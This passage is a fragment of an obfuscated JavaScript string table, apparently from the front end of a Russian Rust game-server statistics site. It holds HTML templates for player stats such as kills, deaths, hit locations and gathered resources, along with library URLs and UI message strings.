20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a</section>\x0a\x0a\x20\x20\x20\x20</div>', 'title', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-cross\x20profile-icon\x22></i>Смертей</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'insertAdjacentHTML', 'nextWipe', 'sulfur', 'ext', 'mushroom', 'initToastManager', '\x22\x20data-table=\x22GGRustPITER\x22>КЛАССИКА\x20х3</button>\x0a\x20\x20\x20\x20<button\x20id=\x22vanilla_stats\x22\x20class=\x22statsBtnProfile\x22\x20data-steamid=\x22', 'crocodiles', 'ggrust', 'Horses', 'td:nth-child(1)', 'Ошибка\x20при\x20запросе\x20данных:', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Тыквы</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/pumpkin.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'stopPropagation', 'initComponentsManager', '338KpvAnn', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20leftfoot\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Левая\x20нога</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>', 'keyCode', 'script', 'defaultServerId', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20torso\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Тело</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Змей</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/snake.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '\x22\x20title=\x22Кликните,\x20чтобы\x20открыть\x20подробную\x20статистику\x22\x20data-steamid=\x22', '#wipeBlock', 'log', 'TotalResourcePoints', 'Name', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22players-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', 'position', '.allplayer', 'remove', 'server', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__item-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/time1.png\x22\x20class=\x22points\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22user-stat__title\x22>Онлайн\x20сегодня</div><span\x20class=\x22user-stat__value\x22>', 'floor', 'Helicopters', 'promoModalShown', '.MonitoringWidget-module__header', 'body\x20no\x20scroll', 'padStart', 'onkeypress', 'Position', 'componentsManager', 'Deaths', 'hostname', 'https://cdn.datatables.net/plug-ins/1.10.24/i18n/Russian.json', 'wood', 'shop.ggrust.ru', ')</span></h1>\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-container-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section-gather\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'topplayer-custom', 'html', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-hippo\x20profile-icon\x22></i>Кабанов\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', '<span\x20class=\x22', '.bonus-amount', 'torso', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Синих\x20ягод</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/blue.berry.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'snakes', 'toFixed', 'ondragstart', 'replaceChild', 'copy', '</div><div\x20class=\x22small-steamid\x22>', ':\x20&nbsp;', 'approximate_member_count', 'appReady', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Смертей</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/skull.trophy.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'active', 'russian-top', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20leftarm\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Левая\x20рука</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>', 'rgb(0\x200\x200\x20/\x2099%)', '.page_player_content_body_loading', 'length', 'TCsDestroyed', '\x22\x20alt=\x22avatar\x22\x20class=\x22player-avatar\x22\x20onclick=\x22event.stopPropagation();\x20window.open(\x27https://steamcommunity.com/profiles/', 'metal.ore', '&times;', 'KillsNpc', '.statsBtn', '<\x22row\x22<\x22col-sm-6\x22l><\x22col-sm-6\x22fB>>tip', 'Wolves', '\x22\x20data-table=\x22GGRustVANILLA\x22>VANILLA\x202х2</button>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<audio\x20style=\x22display:\x20none;\x22\x20id=\x22successSound\x22\x20src=\x22https://rustaria.ru/toast.mp3\x22\x20preload=\x22auto\x22></audio>\x0a\x20\x20\x20\x20<audio\x20style=\x22display:\x20none;\x22\x20id=\x22failSound\x22\x20src=\x22https://rustaria.ru/error.mp3\x22\x20preload=\x22auto\x22></audio>', 'onmousedown', 'insertBefore', 'Retrying\x20UpdateDiscord...', 'Ошибка\x20при\x20отображении\x20данных:', '<span>', 'map', 'Discord\x20query\x20not\x20ok\x20', 'load', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-rocket\x20profile-icon\x22></i>Ракет</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'date-color', 'tigers', 'addListener', '\x27\x20скопирован\x20в\x20буфер\x20обмена!', '37790863UFYDhj', 'rightfoot', 'Кнопка\x20обновления\x20не\x20найдена', 'PlayerPvpStats_Deaths', 'Toast-module__error', 'krasnodar_stats', 'horses', '#promoModal', 'Button\x20with\x20id\x20\x27', 'https://stats.ggrust.ru/sound.php', 'StateHitBone', 'GET', '\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-position\x22>#', 'Chickens', 'C4Thrown', 'TotalCropsGrown', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Граната</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/grenade.f1.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-clock\x20profile-icon\x22></i>Наиграно</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'MiscStats', '999999', 'getAttribute', 'data', '</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', 'order', '.topBtn.active', 'catch', 'https://cdn.datatables.net/1.10.24/js/jquery.dataTables.js', 'change', 'addedNodes', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Убийств</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/rifle.ak.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'button', '.player-view', 'from', 'ggrust.ru', 'preventDefault', 'guild', 'LeftArmHits', 'Категория', '#statistics\x20tbody', 'toDataURL', 'addEventListener', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Скрафчено</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/Blueprint_icon.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-